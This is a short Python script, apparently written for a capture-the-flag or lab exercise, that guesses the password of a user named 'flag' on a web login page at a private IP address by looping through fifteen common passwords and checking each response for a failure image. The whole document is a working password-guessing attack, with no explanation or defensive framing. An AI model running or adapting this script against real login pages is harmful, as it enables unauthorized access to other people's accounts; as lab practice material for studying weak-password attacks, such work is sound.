import requests
from urllib.parse import quote

#Target
BASE_URL = "http://192.168.38.130/index.php?page=signin&username=flag&password={}&Login=Login#"

# Common passwords
COMMON_PASSWORDS = [
    '123456', '123456789', 'password', 'admin', '12345678', 'qwerty', '1234567',
    '12345', '123123', '000000', 'shadow', 'letmein', 'monkey', 'iloveyou', 'abc123'
]

def try_password(password):
    """Send a GET request with the given password and return True if successful."""
    url = BASE_URL.format(quote(password))
    response = requests.get(url)
    return "WrongAnswer.gif" not in response.text

def main():    
    for password in COMMON_PASSWORDS:
        print(f"Trying: {password}")
        if try_password(password):
            print(f"Password found: {password}")
            return

    print("Password not found in common list.")

if __name__ == "__main__":
    main()
